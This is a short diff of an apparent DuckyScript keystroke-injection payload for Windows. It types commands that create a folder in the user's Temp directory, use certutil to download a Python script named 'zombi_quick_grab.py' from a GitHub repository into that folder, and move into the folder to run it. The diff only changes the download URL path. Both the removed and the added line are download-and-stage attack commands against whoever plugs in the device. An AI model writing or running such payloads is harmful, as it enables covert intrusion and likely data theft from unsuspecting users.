@@ -6,7 +6,7 @@ DELAY 600
 STRING IF NOT EXIST "C:\Users\%USERNAME%\AppData\Local\Temp\zombi" (mkdir "C:\Users\%USERNAME%\AppData\Local\Temp\zombi")
 ENTER
 DELAY 600
-STRING certutil -urlcache -split -f "https://raw.githubusercontent.com/LibertyWalk999/zombi/main/zombi_quick_grab.py" "C:\Users\%USERNAME%\AppData\Local\Temp\zombi\zombi.py"
+STRING certutil -urlcache -split -f "https://raw.githubusercontent.com/LibertyWalk999/zombi/main/components/zombi_quick_grab.py" "C:\Users\%USERNAME%\AppData\Local\Temp\zombi\zombi.py"
 ENTER
 DELAY 500
 STRING cd "C:\Users\%USERNAME%\AppData\Local\Temp\zombi"
